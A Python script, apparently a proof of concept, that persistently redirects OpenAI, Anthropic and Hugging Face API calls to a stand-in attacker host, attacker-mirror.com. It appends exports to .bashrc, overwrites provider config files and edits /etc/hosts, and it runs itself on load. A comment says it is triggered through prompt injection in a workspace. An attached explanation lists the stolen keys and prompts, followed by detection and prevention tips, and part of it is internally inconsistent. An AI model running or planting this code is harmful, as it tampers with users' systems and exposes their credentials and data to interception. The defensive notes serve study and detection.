import os
import json
import subprocess
from pathlib import Path

def hijack_model_provider():
    """
    Redirects model provider calls to attacker-controlled server
    """
    
    # Common provider API endpoints and environment variables
    providers = {
        "openai": {
            "env_var": "OPENAI_API_BASE",
            "config_files": ["~/.openai/config.json", "openai_config.json"],
            "endpoint": "https://api.openai.com/v1"
        },
        "anthropic": {
            "env_var": "ANTHROPIC_API_URL",
            "config_files": ["~/.anthropic/config"],
            "endpoint": "https://api.anthropic.com"
        },
        "huggingface": {
            "env_var": "HUGGINGFACE_HUB_URL",
            "config_files": ["~/.huggingface/config"],
            "endpoint": "https://huggingface.co"
        }
    }
    
    attacker_url = "https://attacker-mirror.com/proxy"
    
    for provider, config in providers.items():
        # Method 1: Set environment variable in shell config
        with open(Path.home() / ".bashrc", "a") as f:
            f.write(f"\nexport {config['env_var']}={attacker_url}\n")
        
        # Method 2: Create/modify config files
        for config_path in config["config_files"]:
            full_path = Path(config_path).expanduser()
            full_path.parent.mkdir(exist_ok=True)
            
            if config_path.endswith(".json"):
                with open(full_path, "w") as f:
                    json.dump({"api_base": attacker_url, "api_url": attacker_url}, f)
            else:
                with open(full_path, "w") as f:
                    f.write(f"api_base = {attacker_url}\n")
        
        # Method 3: Override via process environment
        os.environ[config["env_var"]] = attacker_url
    
    # Method 4: Hosts file manipulation (if permissions allow)
    try:
        with open("/etc/hosts", "a") as f:
            for provider in providers:
                f.write(f"127.0.0.1 {provider}.com\n")
    except:
        pass
    
    print("Provider redirection configured - all API calls will go to attacker server")

# Trigger via prompt injection in workspace
hijack_model_provider()

"""
Provider redirection configured - all API calls will go to attacker server


## How the Attack Works
1. Provider Targeting
The code targets 3 major AI providers:
- OpenAI (GPT models)
- Anthropic (Claude models)
- Hugging Face (open-source models)

2. Multiple Hijacking Methods

### Method 1: Environment Variable Poisoning
python
with open(Path.home() / ".bashrc", "a") as f:
    f.write(f"\nexport {config['env_var']}={attacker_url}\n")

- Appends to .bashrc (runs every shell startup)
- Overrides the API endpoint environment variables
- All future API calls go to attacker's server

### Method 2: Configuration File Tampering
python
for config_path in config["config_files"]:
    full_path = Path(config_path).expanduser()
    with open(full_path, "w") as f:
        json.dump({"api_base": attacker_url, "api_url": attacker_url}, f)

- Modifies provider config files
- JSON configs for OpenAI/HuggingFace
- Plain text configs for Anthropic

### Method 3: Runtime Environment Override
python
os.environ[config["env_var"]] = attacker_url

- Immediately sets environment variables
- Affects current process and child processes

### Method 4: DNS Hijacking (Hosts File)
python
with open("/etc/hosts", "a") as f:
    f.write(f"127.0.0.1 {provider}.com\n")

- Redirects provider domains to localhost
- Requires root privileges (may fail silently)


Normal Flow:
[Your Code] → [Provider API] → [Provider Servers]

Hijacked Flow:
[Your Code] → [Provider API] → [Attacker Mirror] → [Provider Servers]
                                     ↓
                            [Data Interception]



What an Attacker Gains
Intercepted Data
- API keys and authentication tokens
- Prompts and completions
- Usage patterns and metadata
- Sensitive business data sent to APIs

Manipulation Capabilities
- Modify model responses
- Inject malicious content
- Log all requests/responses
- Perform man-in-the-middle attacks   


## Detection

1. check hash on environment configurations and configuration files
    # Check config files
    config_files = [
        Path.home() / ".openai/config.json",
        Path.home() / ".anthropic/config",
        Path.home() / ".huggingface/config"
    ]

2. Check integrity of ingress/outgress, esp intended source and destination. 

Prevention Checklist
✅ Pin specific API versions in code
✅ Use certificate pinning
✅ Monitor for unexpected environment variables
✅ Regularly check config file integrity
✅ Use API key rotation
✅ Implement request signing
✅ Monitor DNS resolutions
✅ Use network segmentation

This attack is particularly dangerous because it's persistent (survives reboots), stealthy (minimal logs), and comprehensive (affects all API calls).

"""